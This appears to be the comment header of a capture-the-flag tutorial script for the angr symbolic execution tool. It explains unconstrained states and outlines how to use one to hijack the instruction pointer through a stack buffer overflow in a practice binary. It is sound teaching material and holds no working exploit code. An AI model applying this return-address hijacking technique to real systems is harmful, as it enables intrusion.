# An unconstrained state occurs when there are too many
# possible branches from a single instruction. This occurs, among other ways,
# when the instruction pointer (on x86, eip) is completely symbolic, meaning
# that user input can control the address of code the computer executes.
# For example, imagine the following pseudo assembly:
#
# mov user_input, eax
# jmp eax
#
# The value of what the user entered dictates the next instruction. This
# is an unconstrained state. It wouldn't usually make sense for the execution
# engine to continue. (Where should the program jump to if eax could be
# anything?) Normally, when Angr encounters an unconstrained state, it throws
# it out. In our case, we want to exploit the unconstrained state to jump to
# a location of our choosing. We will get to how to disable Angr's default
# behavior later.
#
# This challenge represents a classic stack-based buffer overflow attack to
# overwrite the return address and jump to a function that prints "Good Job."
# Our strategy for solving the challenge is as follows:
# 1. Initialize the simulation and ask Angr to record unconstrained states.
# 2. Step through the simulation until we have found a state where eip is
#    symbolic.
# 3. Constrain eip to equal the address of the "print_good" function.
